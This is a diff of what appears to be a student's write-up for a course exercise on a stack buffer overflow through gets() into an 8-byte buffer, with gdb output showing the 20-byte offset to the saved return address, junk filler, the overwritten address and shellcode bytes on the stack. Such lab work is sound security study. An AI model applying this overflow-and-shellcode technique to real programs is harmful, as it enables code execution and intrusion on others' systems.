@@ -1,4 +1,4 @@
-For q1, the vulnerability was that char door[8] could be overflowed since it only holds 8 characters and there is nothing preventing us from adding more in gets(). This means we can add characters to overwrite the return address and run our shellcode.
+For q1, the vulnerability was that char door[8] could be overflowed since it only holds 8 characters and there is nothing preventing us from adding more in gets(). This means we can add characters to overwrite the return address and run our shellcode. We find that we need 20 (0xbffffc2c - 0xbffffc18) bytes to overwrite the eip.
 
 (gdb) print &door
 $1 = (char (*)[8]) 0xbffffc18
@@ -18,7 +18,7 @@ Stack level 0, frame at 0xbffffc30:
 (gdb) x/20x $esp
 0xbffffc00:     0xb7fd23e4      0x00200000      0x0804a000      0x08048492
 0xbffffc10:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7e5f225
-0xbffffc20:     0xb7fed270      0x00000000      0xbffffc38      0x0804842a
+0xbffffc20:     0xb7fed270      0x00000000      0xbffffc38      0x0804842a	<-- eip
 0xbffffc30:     0x08048440      0x00000000      0x00000000      0xb7e454d3
 0xbffffc40:     0x00000001      0xbffffcd4      0xbffffcdc      0xb7fdc858
 (gdb) step
@@ -33,8 +33,8 @@ Stack level 0, frame at 0xbffffc30:
  Saved registers:
   ebp at 0xbffffc28, eip at 0xbffffc2c
 (gdb) x/20x $esp
-0xbffffc00:     0xbffffc18      0x00200000      0x0804a000      0x08048492
-0xbffffc10:     0x00000001      0xbffffcd4      0x46464646      0x46464646
-0xbffffc20:     0x46464646      0x46464646      0x46464646      0xbffffc30
+0xbffffc00:     0xbffffc18      0x00200000      0x0804a000      0x08048492 
+0xbffffc10:     0x00000001      0xbffffcd4      0x46464646      0x46464646  <-- junk characters in buffer
+0xbffffc20:     0x46464646      0x46464646      0x46464646      0xbffffc30	<-- address of shellcode
 0xbffffc30:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
 0xbffffc40:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
